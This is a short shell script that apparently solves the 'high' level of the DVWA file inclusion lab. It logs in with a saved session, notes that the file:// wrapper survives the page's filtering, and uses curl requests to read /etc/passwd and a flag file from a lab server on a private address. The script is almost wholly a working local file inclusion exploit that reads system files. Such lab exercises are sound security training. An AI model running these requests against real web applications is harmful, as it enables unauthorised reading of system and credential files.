#Login with the known details
source ../levelled_login.sh high
#Check out the "File injection" page
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/fi/ > /dev/null
#file:// wrapper still works, others are scrubbed
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "file:///etc/passwd") > passwd
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "file:///var/www/html/dvwa/hackable/flags/fi.php") > hackable
unset LEVEL
unset SESSIONID
